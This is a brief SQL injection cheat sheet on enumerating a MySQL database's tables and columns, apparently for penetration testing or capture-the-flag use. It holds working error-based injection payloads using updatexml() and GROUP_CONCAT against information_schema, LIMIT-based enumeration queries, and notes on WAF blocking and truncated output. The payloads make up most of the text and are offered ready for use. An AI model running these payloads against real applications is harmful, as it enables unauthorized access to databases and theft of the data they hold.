Enumeration Methods

LIMIT (one by one)

LIMIT 0,1
LIMIT 1,1
LIMIT 2,1

Example:

SELECT table_name FROM information_schema.tables LIMIT 1,1

---

GROUP_CONCAT (all at once)

Tables:

' AND updatexml(1,concat('~',(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='database_name'),'~'),1)-- -

Columns:

' AND updatexml(1,concat('~',(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),'~'),1)-- -

---

Quick Reference

Database → database()
Tables → information_schema.tables
Columns → information_schema.columns
Multiple rows → GROUP_CONCAT()
Single row → LIMIT

---

Limitations

- Error messages may be hidden
- Output may be truncated
- WAF may block payloads
